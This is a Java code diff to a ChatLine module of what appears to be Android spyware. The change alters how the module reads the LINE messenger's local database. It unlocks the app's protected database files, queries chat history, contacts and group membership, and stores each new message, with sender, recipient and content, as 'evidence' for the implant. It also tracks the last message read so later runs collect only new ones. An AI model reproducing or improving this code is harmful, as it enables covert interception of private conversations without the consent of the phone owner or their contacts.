@@ -31,11 +31,11 @@ public class ChatLine extends SubModuleChat {
 
 	private Date lastTimestamp;
 
-	private Hashtable<String, Long> lastLine;
+	private long lastLine;
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
 	private String account = "local";
-	private String account_mid= "mid";
+	private String account_mid = "mid";
 
 	private GenericSqliteHelper helper;
 
@@ -62,8 +62,20 @@ public class ChatLine extends SubModuleChat {
 
 	@Override
 	protected void start() {
-		lastLine = markup.unserialize(new Hashtable<String, Long>());
+
+		if (!readChatSemaphore.tryAcquire()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readViberMessageHistory), semaphore red");
+			}
+			return;
+		}
+
 		try {
+
+			lastLine = markup.unserialize(new Long(0));
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (start), read lastSkype: " + lastLine);
+			}
 
 			Path.unprotect(dbFile, 3, true);
 			Path.unprotect(dbFile + "*", true);
@@ -72,18 +84,23 @@ public class ChatLine extends SubModuleChat {
 			helper.deleteAtEnd = false;
 
 			account = readMyPhoneNumber();
-			// if (account != null) {
-			readLineMessageHistory();
-			// }
+			long lastmessage = readLineMessageHistory();
+
+			if (lastmessage > lastLine) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (start) serialize: %d", lastmessage);
+				}
+				markup.serialize(lastmessage);
+			}
+
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notifyStopProgram) Error: " + e);
 			}
+		} finally {
+			readChatSemaphore.release();
 		}
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (start), read lastSkype: " + lastLine);
-		}
 	}
 
 	private String readMyPhoneNumber() {
@@ -149,14 +166,7 @@ public class ChatLine extends SubModuleChat {
 		}
 	}
 
-	private void readLineMessageHistory() throws IOException {
-
-		if (!readChatSemaphore.tryAcquire()) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readViberMessageHistory), semaphore red");
-			}
-			return;
-		}
+	private long readLineMessageHistory() throws IOException {
 
 		try {
 			Path.unprotect(dbFile, 3, true);
@@ -167,9 +177,11 @@ public class ChatLine extends SubModuleChat {
 			// helper.deleteAtEnd = false;
 			final ChatGroups groups = getLineGroups(helper);
 
-			String sqlquery = "select chat_id, from_mid, content, ch.created_time, sent_count , name from chat_history as ch left join contacts as c on ch.from_mid = c.m_id where type=1 order by ch.created_time ";
+			String sqlquery = "select chat_id, from_mid, content, ch.created_time, sent_count , name from chat_history as ch left join contacts as c on ch.from_mid = c.m_id where type=1 and ch.created_time > ? order by ch.created_time ";
 			String[] projection = new String[] { "chat_id", "from_mid", "content", "ch.created_time", "sent_count",
 					"name" };
+
+			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
 			RecordVisitor visitor = new RecordVisitor(null, null) {
 				@Override
@@ -181,30 +193,47 @@ public class ChatLine extends SubModuleChat {
 					Date date = new Date(created_time);
 
 					int sent_count = cursor.getInt(4);
-					String from = cursor.getString(5);
-					if (from == null)
-						from = account;
+					String from_name = cursor.getString(5);
 
-					String to = groups.getGroupTo(from, chat_id);
+					boolean incoming = false;
+					String to = account;
+
+					if (from_name == null) {
+						from_name = account;
+						incoming = false;
+						to = groups.getGroupTo(from_name, chat_id);
+					} else {
+						incoming = true;
+						to = groups.getGroupTo(from_name, chat_id);
+						if (to == null) {
+							to = account;
+						}
+					}
 
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (readLineMessageHistory) %s: %s,%s -> %s ", date.toLocaleString(), from, to,
-								content);
+						Check.log(TAG + " (readLineMessageHistory) %s\n%s: %s, %s -> %s ", chat_id,
+								date.toLocaleString(), content, from_name, to);
 					}
+
+					MessageChat message = new MessageChat(PROGRAM, date, from_name, to, content, incoming);
+					messages.add(message);
+
 					return created_time;
 				}
 			};
 
 			helper.deleteAtEnd = true;
-			helper.traverseRawQuery(sqlquery, null, visitor);
+			long lastmessage = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastLine) }, visitor);
+
+			getModule().saveEvidence(messages);
+
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
-				
+
 				Check.log(TAG + " (readLineMessageHistory) Error: ", ex);
 			}
-		} finally {
-			readChatSemaphore.release();
 		}
+		return lastLine;
 
 	}
 
@@ -219,12 +248,13 @@ public class ChatLine extends SubModuleChat {
 				String mid = cursor.getString(1);
 				String name = cursor.getString(2);
 
-				if(mid.equals(account_mid)){
+				if (mid.equals(account_mid)) {
 					name = account;
 				}
-				//if (Cfg.DEBUG) {
-				//	Check.log(TAG + " (getLineGroups) %s: %s,%s", key, mid, name);
-				//}
+				// if (Cfg.DEBUG) {
+				// Check.log(TAG + " (getLineGroups) %s: %s,%s", key, mid,
+				// name);
+				// }
 				if (name == null) {
 					groups.addPeerToGroup(key, mid);
 				} else {
@@ -238,15 +268,19 @@ public class ChatLine extends SubModuleChat {
 		String sqlquery = "SELECT  chat_id, mid, name FROM 'chat_member' left join contacts on chat_member.mid = contacts.m_id";
 		helper.traverseRawQuery(sqlquery, null, visitor);
 
+		sqlquery = "select chat_id, owner_mid, name from chat as ch left join contacts as c on ch.owner_mid = c.m_id";
+		helper.traverseRawQuery(sqlquery, null, visitor);
+
+		sqlquery = "select distinct chat_id, from_mid, name from chat_history as ch left join contacts as c on ch.from_mid = c.m_id where from_mid not null";
+		helper.traverseRawQuery(sqlquery, null, visitor);
+
 		groups.addLocalToAllGroups(account);
 
 		if (Cfg.DEBUG) {
-			for(String group: groups.getAllGroups()){
+			for (String group : groups.getAllGroups()) {
 				String to = groups.getGroupTo(account, group);
 				Check.log(TAG + " (getLineGroups group) %s : %s", group, to);
 			}
-			
-			
 		}
 		return groups;
 	}
